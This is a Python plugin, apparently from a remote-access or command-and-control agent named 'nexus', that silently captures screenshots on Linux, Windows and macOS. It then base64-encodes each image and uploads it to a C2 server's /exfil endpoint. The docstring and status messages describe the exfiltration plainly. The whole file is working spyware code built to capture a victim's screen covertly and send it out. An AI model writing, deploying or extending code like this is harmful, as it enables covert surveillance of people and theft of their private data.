"""
Plugin !screenshot — captura silenciosa multiplataforma.
Cadena de intentos por entorno:
  Linux Wayland → grim → spectacle -b -n → import (ImageMagick) → mss
  Linux X11     → scrot → import (ImageMagick) → mss
  Windows       → Pillow ImageGrab
  macOS         → screencapture -x

Tras capturar, intenta exfiltrar al servidor C2 via /exfil.
Si falla, reporta la ruta local donde quedó guardado.
"""

import base64
import os
import platform
import subprocess

_OUT = "/tmp/nexus_screenshot.png"


def _exfil_screenshot(path: str) -> tuple[bool, str]:
    import requests
    server_url = os.environ.get("NEXUS_SERVER", "http://127.0.0.1:8080")
    agent_id_file = os.path.join(os.path.dirname(__file__), "..", "..", "agent_id.txt")
    try:
        with open(agent_id_file) as f:
            agent_id = f.read().strip()
    except Exception:
        agent_id = "unknown"
    try:
        with open(path, "rb") as f:
            data = f.read()
        payload = {
            "agent_id": agent_id,
            "filename": os.path.basename(path),
            "size": len(data),
            "data": base64.b64encode(data).decode(),
        }
        resp = requests.post(
            f"{server_url}/exfil",
            json=payload,
            timeout=15,
            headers={"Content-Type": "application/json"},
        )
        if resp.status_code == 200:
            saved = resp.json().get("saved", "?")
            return True, saved
        return False, f"HTTP {resp.status_code}"
    except Exception as exc:
        return False, str(exc)


def _try(cmd: list, out_path: str) -> bool:
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=10)
        return r.returncode == 0 and os.path.exists(out_path)
    except FileNotFoundError:
        return False
    except Exception:
        return False


def _mss(out_path: str) -> bool:
    try:
        import mss
        import mss.tools
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[0])
            mss.tools.to_png(img.rgb, img.size, output=out_path)
        return os.path.exists(out_path)
    except Exception:
        return False


def _pillow(out_path: str) -> bool:
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        img.save(out_path)
        return os.path.exists(out_path)
    except Exception:
        return False


def run(args: str) -> tuple[int, str, str]:
    system = platform.system()

    if system == "Windows":
        out = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "nexus_screenshot.png")
        ok = _pillow(out) or _mss(out)
        path = out

    elif system == "Darwin":
        ok = _try(["screencapture", "-x", _OUT], _OUT)
        path = _OUT

    else:
        # Linux — detectar Wayland vs X11
        # Verificar variable de entorno Y proceso de display server
        session = os.environ.get("XDG_SESSION_TYPE", "").lower()
        if not session:
            # Fallback: detectar por proceso
            try:
                r = subprocess.run(["loginctl", "show-session", "", "-p", "Type"],
                                   capture_output=True, text=True, timeout=5)
                if "wayland" in r.stdout.lower():
                    session = "wayland"
            except Exception:
                pass

        path = _OUT

        if session == "wayland":
            ok = (
                _try(["grim", _OUT], _OUT) or
                _try(["spectacle", "-b", "-n", "-o", _OUT], _OUT) or
                _try(["import", "-window", "root", _OUT], _OUT) or
                _mss(_OUT)
            )
        else:
            # X11 o desconocido — intentar todo
            ok = (
                _try(["scrot", _OUT], _OUT) or
                _try(["spectacle", "-b", "-n", "-o", _OUT], _OUT) or
                _try(["import", "-window", "root", _OUT], _OUT) or
                _mss(_OUT) or
                _try(["gnome-screenshot", "-f", _OUT], _OUT)
            )

    if ok:
        size = os.path.getsize(path)
        exfil_ok, exfil_info = _exfil_screenshot(path)
        if exfil_ok:
            return 0, f"Screenshot capturado ({size} bytes) y exfiltrado al C2:\n  → {exfil_info}", ""
        return 0, f"Screenshot capturado ({size} bytes) — guardado localmente en:\n  {path}\n  [exfil falló: {exfil_info}]", ""

    return 1, "", (
        "No se pudo capturar pantalla.\n"
        "Linux Wayland: instala grim  →  sudo dnf install grim\n"
        "Linux X11:     instala scrot →  sudo dnf install scrot\n"
        "Cualquier OS:  pip install mss   o   pip install Pillow"
    )
